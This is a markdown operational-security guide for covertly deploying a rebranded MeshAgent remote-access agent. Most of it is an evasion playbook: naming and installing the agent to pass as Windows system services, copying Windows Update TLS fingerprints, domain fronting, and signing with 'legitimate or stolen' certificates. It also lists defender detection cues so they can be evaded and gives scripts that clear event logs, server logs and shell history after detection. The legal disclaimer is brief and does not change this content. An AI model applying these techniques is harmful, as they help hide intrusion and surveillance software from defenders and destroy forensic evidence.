# Operational Security Guidelines for MeshAgent

## ⚠️ CRITICAL: Read Before Deployment

This document outlines essential operational security (OpSec) practices for deploying and maintaining MeshAgent infrastructure safely and covertly.

## Repository Security

### **NEVER Commit These Files:**

```
✗ .env (contains real infrastructure)
✗ branding_config.json (contains customized settings)
✗ *.msh (installer files with embedded certificates)
✗ *.pfx, *.pem, *.key (certificates and private keys)
✗ Built *.exe binaries
✗ meshcentral-data/ (server configuration and data)
✗ Any files containing IP addresses or domain names
```

### **Safe to Commit:**

```
✓ Source code (.c, .cpp, .h files)
✓ Template files (*.template.json, .env.template)
✓ Documentation (*.md files - after sanitizing)
✓ Build scripts (build.ps1, Makefile)
✓ Tools (tools/*.py)
```

## Infrastructure Configuration

### 1. Always Use DNS, Never IPs

**WRONG:**
```json
"primaryEndpoint": "wss://72.60.233.29:4445/agent.ashx"
```

**CORRECT:**
```json
"primaryEndpoint": "wss://agents.yourdomain.com:4445/agent.ashx"
```

**Why:** IP addresses in code/config files create permanent links between your infrastructure and the codebase. DNS allows you to change servers without code changes.

### 2. Use Separate Domains for Components

```
Portal:   mesh.yourdomain.com      (User-facing web interface)
Agents:   agents.yourdomain.com    (Agent WebSocket connections)
Relay:    relay.yourdomain.com     (Peer-to-peer relay)
```

**Benefits:**
- Can be hosted on different servers
- Can use different CDNs/proxies
- Easier to pivot if one domain is burned

### 3. DNS Privacy

- **Use privacy-protected WHOIS** for domain registration
- **Consider domain fronting** through CDNs (Cloudflare, CloudFront)
- **Separate registrar accounts** for different operations
- **Use cryptocurrency** for domain payments when possible

## Network Obfuscation

### TLS Fingerprinting

Modern firewalls and IDS can detect MeshAgent by its TLS fingerprint (JA3 hash).

**Always generate obfuscation profiles:**

```bash
python tools/generate_network_profile.py \
  --config branding_config.json \
  --tls-profile windows_update \
  --output-header meshcore/generated/network_profile.h
```

**Profile Selection:**
- **windows_update**: Best for corporate networks (mimics Microsoft Update)
- **chrome_windows**: Good for general web traffic
- **windows_telemetry**: Alternative for diagnostic traffic
- **edge_windows**: For Microsoft-heavy environments

### Domain Fronting (Advanced)

Route traffic through legitimate CDN domains:

```json
{
  "obfuscation": {
    "domainFronting": {
      "enabled": true,
      "sniDomain": "cdn.cloudflare.com",
      "hostHeader": "agents.yourdomain.com",
      "frontDomain": "cloudflare.net"
    }
  }
}
```

## Branding Best Practices

### Realistic Service Names

**AVOID:**
- Acme Corp
- MyCompany
- TestService
- RemoteAdmin

**USE:**
- Microsoft Corporation
- Windows [Component] Service
- System [Function] Host
- Network [Feature] Provider

### Match Windows Conventions

```json
{
  "serviceName": "WinDiagnosticHost",
  "displayName": "Windows Diagnostic Host Service",
  "installRoot": "C:/Windows/System32/DiagnosticHost",
  "versionInfo": {
    "fileVersion": "10.0.19041.0"  // Match Windows version
  }
}
```

### File Naming

**Standard Patterns:**
- `svchost.exe` (generic service host)
- `diaghost.exe` (diagnostic host)
- `nethost.exe` (network host)
- `sysmon.exe` (system monitor)

**AVOID:**
- `agent.exe`
- `remote.exe`
- `mesh.exe`
- Custom company names

## Deployment Security

### Code Signing

**Production deployments MUST be code-signed:**

```powershell
# Use EV Code Signing Certificate
.\sign.ps1 -CertificatePath "production.pfx" `
           -CertificatePassword $securePassword `
           -TimestampServer "http://timestamp.digicert.com"
```

**Why:**
- Reduces SmartScreen warnings
- Increases legitimacy
- Required for some EDR whitelisting

### Build Environment

**Compromised Build = Compromised Operations**

- **Use dedicated build machine** (not your daily driver)
- **Keep build tools offline** when possible
- **Verify Visual Studio integrity** before builds
- **Scan builds with VirusTotal** PRIVATELY (API, not web upload)
- **Never build on GitHub Actions public runners** for sensitive ops

### Server Hardening

**MeshCentral Server Checklist:**

```bash
# 1. Firewall rules (ports only)
ufw allow 443/tcp    # Web portal
ufw allow 4445/tcp   # Agent WebSocket
ufw allow 4450/tcp   # Relay
ufw enable

# 2. Disable unnecessary services
systemctl disable bluetooth
systemctl disable avahi-daemon

# 3. Enable automatic updates (security only)
apt install unattended-upgrades
dpkg-reconfigure -plow unattended-upgrades

# 4. Harden SSH
# Edit /etc/ssh/sshd_config:
PermitRootLogin prohibit-password
PasswordAuthentication no
PubkeyAuthentication yes
```

## Detection Avoidance

### What Blue Teams Look For

**File System:**
- Unusual install locations (`C:\ProgramData\RandomCompany`)
- Unsigned executables
- Services not matching known-good lists
- Suspicious version info

**Network:**
- Persistent WebSocket connections to unknown domains
- Unique TLS fingerprints
- Single-destination traffic patterns
- Non-standard ports for "legitimate" traffic

**Registry:**
- Unknown services in `HKLM\SYSTEM\CurrentControlSet\Services`
- Services with unusual ImagePaths
- Services with custom display names

**Behavioral:**
- Process spawning from service
- Unexpected network connections from system processes
- Remote desktop/terminal activity during off-hours

### Mitigation Strategies

1. **Blend with legitimate traffic**
   - Use Windows Update TLS profile
   - Connect during business hours initially
   - Mimic normal admin activity patterns

2. **Code sign everything**
   - Use legitimate or stolen code signing cert
   - Timestamp signatures properly
   - Match certificate info to company branding

3. **Hide in plain sight**
   - Use Windows system directories
   - Match Microsoft naming conventions
   - Use realistic version information

4. **Minimize footprint**
   - Disable unnecessary persistence mechanisms
   - Encrypt logs
   - Rotate and securely delete old artifacts

## Incident Response (If Detected)

### Burn Notice Protocol

If your infrastructure is detected:

1. **Immediately stop using affected domains/IPs**
2. **Do NOT re-use burned infrastructure**
3. **Spin up new servers on different IPs/domains**
4. **Update all client configurations**
5. **Analyze what was detected and adjust TTPs**

### Evidence Destruction

```powershell
# Client-side cleanup script
Remove-Service "WinDiagnosticHost" -Force
Remove-Item -Recurse -Force "C:\Windows\System32\DiagnosticHost\"
Clear-EventLog -LogName Application
Clear-EventLog -LogName System
```

```bash
# Server-side cleanup
systemctl stop meshcentral
rm -rf /opt/meshcentral/
rm -rf /var/log/nginx/mesh*.log
history -c && cat /dev/null > ~/.bash_history
```

## Legal Considerations

### Authorization Required

- **Written permission** from system owners
- **Scope documentation** defining authorized targets
- **Time limits** on access authorization
- **Data handling agreements**

### Compliance

- **GDPR** (if operating in EU)
- **CCPA** (if operating in California)
- **CFAA** (Computer Fraud and Abuse Act - US)
- **Local computer misuse laws**

### When NOT to Deploy

- Unauthorized penetration testing
- Personal surveillance
- Corporate espionage
- Any illegal activity

## Checklist Before Going Live

```
Security:
[ ] Repository is PRIVATE
[ ] All sensitive data in .gitignore
[ ] Binaries are code-signed
[ ] TLS obfuscation enabled
[ ] Realistic branding configured

Infrastructure:
[ ] Using DNS (not IPs)
[ ] Privacy-protected domain registration
[ ] Firewall rules configured
[ ] SSH hardened with key-only auth
[ ] Automatic security updates enabled

OpSec:
[ ] Build machine is isolated
[ ] No sensitive data committed to Git
[ ] Server logs configured properly
[ ] Incident response plan documented
[ ] Legal authorization obtained

Testing:
[ ] Agent connects successfully
[ ] No detection by local AV/EDR
[ ] TLS fingerprint verified
[ ] Service appears legitimate
[ ] Clean shutdown leaves no traces
```

## Resources

- **MeshCentral Official Docs**: https://github.com/Ylianst/MeshCentral
- **JA3 Fingerprinting**: https://github.com/salesforce/ja3
- **MITRE ATT&CK**: https://attack.mitre.org/ (T1219 - Remote Access Software)
- **OWASP**: https://owasp.org/

---

**Remember:** The best OpSec is not getting caught in the first place. When in doubt, err on the side of caution.
